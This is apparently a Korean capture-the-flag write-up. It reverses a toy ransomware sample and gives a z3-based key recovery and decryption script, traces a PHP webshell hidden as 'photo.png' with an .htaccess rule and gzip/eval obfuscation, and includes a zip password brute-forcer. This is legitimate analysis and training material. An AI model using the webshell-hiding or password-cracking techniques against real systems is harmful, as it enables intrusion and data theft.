FindFirstFileA 함수를 사용해 폴더에 첫번째 파일의 handle 값을 불러오고 handle 값이 없으면 프로그램을 종료시킵니다. 또한 첫번째 파일의 정보를 WIN32_FIND_DATA 구조체로 선언된 lpFindFileData에 저장합니다.

```cpp
cFileName_len = 0i64;
    if ( lpFindFileData.cFileName[0] )          // FileName Check
    {
      v29 = lpFindFileData.cFileName;
      do
      {
        cFileName_len = (unsigned int)(cFileName_len + 1);
        ++v29;
      }
      while ( *v29 );
    }
    if ( cFileName_len > 4 )
    {
      File_extension = *(DWORD *)((char *)&lpFindFileData.dwReserved1 + cFileName_len);// lpFindFileData.cFileName + cFileName_len -4
                                                // 파일 확장자 검색
      if ( File_extension == 'gpj.'
        || File_extension == 'gnp.'
        || File_extension == 'xcod'
        || File_extension == 'cod.'
        || File_extension == 'fig.'
        || File_extension == 'pwh.' )           // .hpw, gif, .doc, docx, .png, .jpg
```

찾은 파일의 이름의 길이를 체크해 파일의 이름이 4보다 길면 파일의 확장자를 확인하는 과정을 거칩니다.

따라서 해당 프로그램이 암호화를 하는 파일의 확장자는 .hwp, .gif, .doc, docx, .png, .jpg의 파일만 암호화 하는 과정을 거치는 것을 알 수 있습니다.

```cpp
[참고]

&lpFindFileData.dwReserved1 + cFileName_len

-
typedef struct _WIN32_FIND_DATAA {
  DWORD    dwFileAttributes;
  FILETIME ftCreationTime;
  FILETIME ftLastAccessTime;
  FILETIME ftLastWriteTime;
  DWORD    nFileSizeHigh;
  DWORD    nFileSizeLow;
  DWORD    dwReserved0;
  DWORD    dwReserved1;
  CHAR     cFileName[MAX_PATH];
  CHAR     cAlternateFileName[14];
  DWORD    dwFileType;
  DWORD    dwCreatorType;
  WORD     wFinderFlags;
} WIN32_FIND_DATAA, *PWIN32_FIND_DATAA, *LPWIN32_FIND_DATAA;

&cFileName[MAX_PATH] - 4의 값은 dwReserved1을 가르키고 있음.
위의 코드는 &lpFindFileData.cFileName + cFileName_len -4 즉 파일 이름의 뒤에서 4자리를 확인하기 위한 과정
```

```cpp
LODWORD(v62) = 4;
file_handle = CreateFileA(
                        &lpFileName,
                        0x80000000i64,
                        0i64,
                        0i64,
                        v62,
                        0,
                        0i64);                  // CreateFileA("C:\hspace_secret\file_name", GENERIC_READ, 0, 0, OPEN_ALWAYS,0,0)
if ( file_handle != -1 )
{
	fileName_len = 0;
	if ( (_BYTE)lpFileName )
	{
		fileName = &lpFileName;
		do
		{
			++fileName_len;
			fileName = (int *)((char *)fileName + 1);
		 }while ( *(_BYTE *)fileName );
	}
v36 = (int *)((char *)&lpFileName + fileName_len);
strcpy((char *)&v67 + fileName_len, "ace");
CreateFileA = (__int64 (__fastcall *)(int *, __int64, _QWORD, _QWORD, int, _DWORD, _QWORD))((unsigned __int64)v104[2].enc ^ v104[2].fn);
*v36 = 'psh.';
		newFileHandle = CreateFileA(&lpFileName, 0x40000000i64, 0i64, 0i64, 2, 0, 0i64);// CreateFileA("C:\hspace_secret\file_name.hspace", GENERIC_WRTIE, 0, 0, CREATE_ALWAYS, 0, 0)
if ( newFileHandle == -1 )
{
		CloseHandle(file_handle);// CloseHandle
}
```

lpFileName을 가지고 폴더에 있는 첫번째 파일을 CreateFileA 함수를 사용해 읽기모드로 handle을 얻어옵니다.

또한 strcpy 함수를 통해 lpFileName에 .hspace의 문자열을 붙여 CreateFileA 함수를 사용해 쓰기모드로 handle을 얻어옵니다.

```cpp
v39 = 0;
((void (__fastcall *)(__int64, CHAR *, __int64, unsigned int *, _QWORD))((unsigned __int64)v104[4].enc ^ v104[4].fn))(// ReadFile
file_handle,
&Buffer,
64i64,
&ReadFile_Len,
0i64);

* ReadFile(file_handle, ProcName, 64, &ReadFile_Len, 0, 
```

첫번째 CreateFileA 함수를 사용해 가져온 Handle 값을 가지고 ReadFile 함수를 실행시켜 Buffer 변수에 파일의 내용을 저장합니다.

```cpp
if ( ReadFile_Len )
{
	do
	{
		v41 = 0;
		v42 = (unsigned __int64)v40 >> 2;// ReadFile_Len <= 0
		if ( v42 )
		{
			LOBYTE(v43) = count;
			v44 = table[count];// get index
			v45 = &table[count];
			ProcName_Buffer = ProcName;
			do                            // Well512 random function
			{
				++v39;
				++v41;
				ProcName_Buffer += 4;
				v47 = v44 ^ table[((_BYTE)v43 - 3) & 0xF] ^ ((table[((_BYTE)v43 - 3) & 0xF] ^ (2 * v44)) << 15);
				v48 = (table[((_BYTE)v43 - 7) & 0xF] >> 11) ^ table[((_BYTE)v43 - 7) & 0xF];
				*v45 = v48 ^ v47;
				v49 = ((_BYTE)v43 - 1) & 0xF;
				v43 = ((_BYTE)v43 - 1) & 0xF;
				v45 = &table[v49];
				count = v43;
				ProcName_Buffer_1_char = *((_DWORD *)ProcName_Buffer - 1);
				v44 = *v45 ^ v47 ^ v48 ^ v47 ^ (32 * ((v48 ^ v47) & 0xFED22169)) ^ (4 * (*v45 ^ ((v47 ^ (v48 << 10)) << 16)));
				*v45 = v44;
				*((_DWORD *)ProcName_Buffer - 1) = v44 ^ __ROR4__(ProcName_Buffer_1_char, v39 & 0x1F);
				//Well512 난수 ^ 파일 내용 Buffer
			}while ( v41 < v42 );
				v40 = ReadFile_Len;
}
```

ReadFile_Len의 값이 있으면 암호화가 진행됩니다. do ~ while 문이 암호화를 진행하는 부분입니다.

Well512 알고리즘을 사용해 난수를 발생시키며 Well512의 난수 생성 마지막 Seed의 값은 위에서 구했던 컴퓨터 이름을 사용해 CRC32로 생성한 값이 들어가게 됩니다.

z3-solver를 사용해 첫번째로 불러오는 파일의 헤더와 암호화된 헤더를 계산하면 Well512의 마지막 Seed의 값을 구할 수 있습니다. 코드는 다음과 같습니다.

```python
from z3 import *
import struct
import os

index = 0
table = [
	0x63a59cfe, 0x7545df65, 0x6b2c8b04, 0xca615449,
	0x80a9156c, 0x56b29cd0, 0xf1cd0100, 0xd8c726db,
	0x3ce57ffc, 0xb18c98ef, 0x9850c425, 0x702c2ef5,
	0x86064b64, 0x6765a9ee, 0xc2aaa5c0, 0xffffffff,
]

def rol(data, shift, size=32):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size)
    return (body + remains)

def well512():
    global index, table

    a = table[index]
   
    c = table[(index + 13) & 15]
    b = (a ^ c ^ (a << 16) ^ (c << 15)) & 0xFFFFFFFF
    c = table[(index + 9) & 15]
    c ^= (c >> 11)
    a = table[index] = b ^ c
    d = a ^ ((a << 5) & 0xda442d20)
    index = (index + 15) & 15
    a = table[index]
    table[index] = (a ^ b ^ d ^ (a << 2) ^ (b << 18) ^ (c << 28)) & 0xFFFFFFFF
    
    return table[index]

b=0x4cc93510
c=0xb19aa97c
d=0x7713916c

pfile = 0x5896C74B
s = Solver()
x = BitVec('x', 64)
s.add(And(x >= 0, x <= 0xFFFFFFFF))
k = rol(((x ^ b ^ d ^ (x << 2) ^ (b << 18) ^ (c << 28)) & 0xFFFFFFFF) ^ pfile, 1)
s.add(k == 1196314761) # PNG Header 4bytes

if s.check() == sat:
    seed = int(str(s.model()[x]))
    print(seed)
    table[15] = seed

# seed = 3290579535
```

이제 Seed의 값을 구하였으므로 모든 파일을 순차대로 복호화 하는 코드는 다음과 같습니다.

 * 파일을 순차대로 복구해야하는 이유 : Well512 함수가 불러와진 순서대로 복호화가 진행되어야함. 그렇지 않으면 암호화에 사용된 난수의 값이 달라져 복호화가 제대로 진행되지 않음.

```python
from z3 import *
import struct
import os
dir = ".\\solver\\hspace_secrets"

def p32(x): return struct.pack('<L', x)
def u32(x): return struct.unpack('<L', x)[0]

index = 0
table = [
	0x63a59cfe, 0x7545df65, 0x6b2c8b04, 0xca615449,
	0x80a9156c, 0x56b29cd0, 0xf1cd0100, 0xd8c726db,
	0x3ce57ffc, 0xb18c98ef, 0x9850c425, 0x702c2ef5,
	0x86064b64, 0x6765a9ee, 0xc2aaa5c0, 0xffffffff,
]

def rol(data, shift, size=32):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size)
    return (body + remains)

def well512():
    global index, table

    a = table[index]
   
    c = table[(index + 13) & 15]
    b = (a ^ c ^ (a << 16) ^ (c << 15)) & 0xFFFFFFFF
    c = table[(index + 9) & 15]
    c ^= (c >> 11)
    a = table[index] = b ^ c
    d = a ^ ((a << 5) & 0xda442d20)
    index = (index + 15) & 15
    a = table[index]
    table[index] = (a ^ b ^ d ^ (a << 2) ^ (b << 18) ^ (c << 28)) & 0xFFFFFFFF
    
    return table[index]

def search_dir(dir):
    encryptFile = list()
    filenames = os.listdir(dir)
    for filename in filenames:
        full_filename = os.path.join(dir, filename)
        ext = os.path.splitext(full_filename)[-1]
        if ext == '.hspace':
            encryptFile.append(full_filename)
    return encryptFile

b=0x4cc93510
c=0xb19aa97c
d=0x7713916c

pfile = 0x5896C74B
s = Solver()
x = BitVec('x', 64)
s.add(And(x >= 0, x <= 0xFFFFFFFF))
k = rol(((x ^ b ^ d ^ (x << 2) ^ (b << 18) ^ (c << 28)) & 0xFFFFFFFF) ^ pfile, 1)
s.add(k == 1196314761)

if s.check() == sat:
    seed = int(str(s.model()[x]))
    table[15] = seed

dirlist = search_dir(dir)

for i in range(len(dirlist)):
    print("[INFO] decrypt ", dirlist[i])
    encryptData = open(dirlist[i], "rb").read()
    decryptData = b""
    shift = 0
    for j in range(0, len(encryptData), 4):
        data = bytes(encryptData[j:j+4])
        if(len(data) < 4):
            decryptData += data
            break
        shift += 1
        decryptData += p32(rol(u32(data) ^ well512(), shift & 0b11111))
    FileList = open(dirlist[i][:-7], "wb")
    FileList.write(decryptData)
```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2072.png)

FLAG: hspace{2asy_t1ny_ma1war2}

## [FORENSIC] nnennory_20H2

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_1.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_2.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_3.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_4.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_5.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_6.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_7.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_8.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_9.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_10.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_11.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_12.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_13.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_14.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_15.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_16.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_17.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_18.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/hspaceCTF_nnennory20H2_19.png)

FLAG: hspace{I_never_dreamed_about_memory}

## [FORENSIC] Emergency In hack

Plus Tip: 실제 서비스 환경처럼 리얼리티 하게 진행하기 위해 APM(Apache, PHP, MySQL)를 각각 컴파일로 설치하여 필요한 것 만 설치 → (Apache: Web Root Dir, Log Dir, Config Dir 달라짐), (PHP: php.ini 위치, config 위치 달라짐)

실제 공격 사례와 시나리오를 모티브로 제작

Hint로 공격 당시 Pcap를 제공 하였으므로, Web Log의 Access, Error는 살펴볼 필요는 없다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2073.png)

1-1.  문제 다운로드 및 압축 해제 하기 (Pcap, OVA → VMware files)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2074.png)

1-2. Wireshark Protocol list중 IPv4 → TCP → (TLS, HTTP)가 존재

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2075.png)

1-3. IPv4 list에서 (172.16.37.4 / 172.16.37.5 / 172.16.37.12, 172.16.37.69)로 총 4개의 IP 존재를 확인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2076.png)

1-4. TCP list (172.16.37.4 / 172.16.37.12 / 172.16.37.69) → 동적 포트 (Dynamic Port) 클라이언트

172.16.37.5는 고정 포트 (80, 443) 서버일 가능성이 높다

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2077.png)

1-5. HTTP object list 확인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2078.png)

1-6. HTTP object list에서 POST의 "application/x-www-form-urlencoded"로 전송되는 데이터 확인 (비정상 행위 X)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2079.png)

1-7.  HTTP GET method 필터링으로 검색 (너무 많은 패킷의 양)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2080.png)

1-8. HTTP POST Method 필터링으로 검색 (너무 많고, 비 정상 행위 X) 

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2081.png)

1-9. TLS Packet에서는 443 Port 암호화하여 통신하는 패킷을 찾을 수 있음.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2082.png)

2-1 . 가상머신을 실행시키면 위 와 같이 시나리오 상 웹페이지가 변조된걸 볼 수 있음. (HTTP 접근시)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2083.png)

2-2. HTTPS로 접근시 최신 브라우저 사용시 SSL 알고리즘 상 브라우저에서 차단됨. (공격 당시 취약한 환경에서 SSL 패킷을 분석할 수 있도록 취약한 알고리즘을 선택하기 위해 최신 브라우저에서는 못들어오도록 차단설정함.) → 분석 혼동을 막기 위한 조치 Elliptic Curve Diffie-Hellman Exchange — 타원곡선 디피헬만 키교환 활성화 되어 있으면 서버의 비밀키로도 복호화 X

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2084.png)

2-3. 메인 페이지 접근(/index.php)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2085.png)

2-4. 많은 게시판중 "고객 게시판"에만 유일하게 글이 작성되어 있고, 로그인을 하지 않아도 글이 작성됨.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2086.png)

2-5. 위와 같이 차례대로 게시글이 눌러서 확인해보면 "s.jpg", ".htaccess" 파일과 "photo.png" 파일을 업로드된 걸 볼 수 있음. ".htaccess" 파일의 경우 해당 디렉터리에 접근제어 (Apache 설정)을 변경할 수 있음

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2087.png)

2-6. 첨부 파일인 ".htaccess" 파일 다운로드 시도시 위 그림와 같이 "파일이 존재 하지 않습니다." 문구가 출력됨.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2088.png)

2-7. 첨부 파일인 "photo.png" 파일 다운로드 시도시 위 그림와 같이 "파일이 존재 하지 않습니다." 문구가 출력됨. 

파일을 삭제를 하기 위해서는 정상적인 게시글 수정 절차를 거치면 파일이 존재하지 않지만. 현재는 비정상적인 행위로 인해 파일 목록만 존재하고 실제 파일은 존재하지 않으므로, 공격 행위일 가능성이 높다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2089.png)

3-1. Pcap 파일은 Wireshark로 분석을 할 수 있지만 한눈에 보기 위해 "Network Miner"도 종종 사용된다.

위 그림와 같이 "172.16.37.5"가 리눅스인걸 알 수 있다. (TTL로 파악)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2090.png)

3-2. 삭제된 게시글에 업로드된 해당 파일을 검색 해보았지만 존재하지가 않는다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2091.png)

3-3. 삭제된 게시글에 업로드된 해당 파일을 검색 해보았지만 존재하지가 않는다.

평문 HTTP에서는 더이상 이상행위가 기록되지 않았음으로, TLS(암호화된) 패킷을 분석을 시도한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2092.png)

4-1. TLS 키 교환 하기전 Client가 사용할 암호 알고리즘 리스트를 서버측에 전송한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2093.png)

4-2. Diffie-Hellman 디피헬만 암호화 방식이 아닌 서버의 비밀키로 복호화가 가능한 취약한 알고리즘으로 연결을 시도

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2094.png)

5-1. 제공된 계정으로 서버에 로그인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2095.png)

5-2. 웹 루트 디렉터리를 찾는다. (패키지로 아파치를 설치했다면 기본적으로 /var/www/html/"에 존재 하지만 현재 컴파일 작업으로 웹 루트 디렉터리가 다른곳으로 설정되어 있다.

찾는 방법은 프로세스를 추적하여 설정 값을 보거나 아니면 위와 같이 php 파일 및 아파치 설정 파일을 검색하여 위치를 찾을 수 있다. ("/usr/local/dongdonge/htdocs/")

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2096.png)

5-3. "/usr/local/dongdonge/conf/extra"의 ssl 관련 설정값 확인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2097.png)

5-4. SSL Server Private key 위치 확인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2098.png)

5-5. SSL 관련 키 확인

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2099.png)

6-1. 비밀키를 추출하여 Wireshark에 서버 아이피 "172.16.37.5"와 TLS으로 암호화된 서비스의 포트 443과 Key를 등록한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20100.png)

6-2. 암호화된 TLS 패킷이 복호화되어 평문으로 보여진다.

그리고 평문으로 보여지고 POST 값으로 필터링하여 검색한 결과 복호화 하기전 찾지 못했던 "photo.png" 파일에 Method "POST"로 여러번 요청한 값을 확인할 수 있다.

웬만하면 이미지 파일(jpg, png, jpeg 등등)에 GET으로 요청하지, POST로는 요청하지 않는다.

웹쉘 경우 GET으로 명령어 사용시 서버측 Access 로그에 행위가 기록됨으로, 대부분 악성 웹쉘은 POST로 전송한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20101.png)

6-3. 공격자가 3개의 파일 "s.jpg", "photo.jpg", ".htaccess" 파일이 업로드된걸 볼 수 있으며,

그중 "s.jpg" 파일은 정상 이미지 파일로 확인할 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20102.png)

6-4. 하지만 "photo.png"의 시그니처와 업로드된 파일 내용을 보면 이미지가 아닌 eval함수와 알수 없게 암호화된 값이 삽입되어 있는걸 볼 수 있으며,

".htaccess" 파일의 경우 php 실행 파일을 ".php" 뿐만 아니라 ".jpg", ".jpeg", ".png" 파일도 PHP 코드로 실행할 수 있도록 설정되어 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20103.png)

6-5. 업로드된 악성 쉘 (웹쉘)을 분석하기 위해 "photo.png"로 연결된 패킷을 필터하고 검색한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20104.png)

6-6. 처음에는 GET으로 1차 연결한다. 하지만 해당 웹쉘은 타사용자와 서버 관리자에게는 보여지면 안되기에 서버에서는 응답으로 200OK를 반환하지만 리스폰 되는 값은 페이크로 "해당 페이지가 존재하지 않습니다"라는 404 Not Found로 보여지게 된다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20105.png)

6-7. 이후 POST로 웹쉘을 작동하기 위해 패스워드를 "Beretta92"를 삽입하여 웹쉘이 동작하도록 수행한다.

이후 "CMD" 파라미터에 "ls" 명령어를 실행한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20106.png)

6-8. 응답값을 확인하여 웹쉘이 정상적으로 작동하여 명령이 실행된걸 확인할 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20107.png)

6-9. 그리고 특정 명령 "aa"를 삽입하여 무언가 행위가 이뤄지고 해당 경로에 플래그와 index.html 파일이 압축이 해제된걸 볼 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20108.png)

6-10. 이후 공격자는 공격행위에 대한 흔적을 지우기 위해 "photo.png" 파일과 ".htaccess" 파일을 제거하고

이후 접근시 서버측에서는 아까와 다르게 "HTTP/1.1 404 Not Found"를 반환한다.

즉 웹쉘이 완벽하게 삭제된걸 볼 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20109.png)

6-11. Wireshark로 해당 웹쉘을 추출하면 위와 같은 모습으로 되어 있다.

PHP 코드로 작성되어 있으며, 문자열이 gz압축되어 있으며, 이걸 압축 해제하여 eval함수로 실행한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20110.png)

6-12. 해당 악성코드(웹쉘)을 분석하기 위해 eval function으로 실행하지 말고 echo로 문자열을 해제한 값을 출력한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20111.png)

6-13. PHP Cli이 설치되어 있다면, 위와 같은 명령으로 바로 실행이 가능하다.

실행한 결과를 보면 "6-12"로 압축된 문자열이 해제되어 보여진다.

<코드 설명해주기 → 2중 문자열 압축>

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20112.png)

6-14. "6-13"코드를 vscode로 쓰-윽 더 한눈에 보기 쉽게 볼 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20113.png)

6-15. 이중 문자열 압축된걸 또 같은 방법으로 해제 한다면 위 그림와 같이 볼 수 있다.

\<코드 설명\>

실제 바이너리로된 악성코드를 넣는다면 분석 시간과 노력이 많이 필요함으로, 악성코드와 비슷하게

집 파일만 넣어서 떨궈주고 집파일이 실행하여 웹페이지를 변조하는 원리로 넣었다고 생각하면된다.

또한 위 방법은 실제로 악성코드로 내부망 감염을 위해 먼저 웹방화벽을 우회하기 위한 목적으로 위와 같은 원리로 진행함.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20114.png)

해당 웹쉘을 분석하여 숨어져있는 웹쉘을 추출하여 암호화된 집 파일을 해제하면 2개의 파일을 볼 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20115.png)

6-16. 변조 당한 웹 페이지다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20116.png)

6-17. 요건 플래그다.

FLAG: hspace{F@ke_zBxAs_H@ck_VMBinwBYb_Sell}

## [NETWORK] Zip-ZIP

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20117.png)

1-1. Pcap속 Protocol 확인하기

IPv4의 TCP 통신(100%)의 HTTP 프로토콜 통신을 확인할 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20118.png)

1-2. IPv4 통신 중 IP Address가 2개만 존재하는걸 확인할 수 있음. (192.168.193.2 / 192.168.193.3)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20119.png)

1-3. 192.168.193.2 포트 번호(49903 ~ 49915)를 확인해보면 (Dynamic port)

192.168.193.3:5000 (Registered Port) 서버일 확률은 높음

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20120.png)

1-4. 힌트로 "zip" 파일 이므로 검색을 해본다. 

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20121.png)

1-5.  검색 방법에는 "Hex"로 Wireshark Search 기능을 이용하거나 위 그림와 같이 HTTP Search기능을 이용하여 검색할 수 있음. (검색 방법은 다양하게 이용할 수 있다.)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20122.png)

- [file1.txt.zip](http://file1.txt.zip) 파일

[file1.txt.zip](http://file1.txt.zip) footer에 힌트로 "Password hint 7digit number"..로 작성되어 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20123.png)

- [file2.txt.zip](http://file2.txt.zip) 파일

```python
import pyzipper
import  time
from    multiprocessing import Process, Pool

start_time = time.time()
zipfilename = "./file1.txt.zip"

def extract_file(passwords):
    with pyzipper.AESZipFile(zipfilename) as zip_file:
        try:
            zip_file.extractall(pwd=passwords.encode("utf-8"))
        except:
            pass
        else:
            password = "\n[+] Password is: %s [+] \n" % passwords
            print(password)
            print("[---] %s time" % (time.time() - start_time))
            return passwords

def main():
    ps_cnt = 12

    pool   = Pool(processes=ps_cnt)

    data = pool.map(extract_file, [str(i).zfill(7) for i in range(0, 9999999)])

if __name__ == '__main__':
    main()
```

file1.txt_creack.py

```python
python3 file1.txt_creack.py

[+] Password is: 0970131 [+]
```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20124.png)

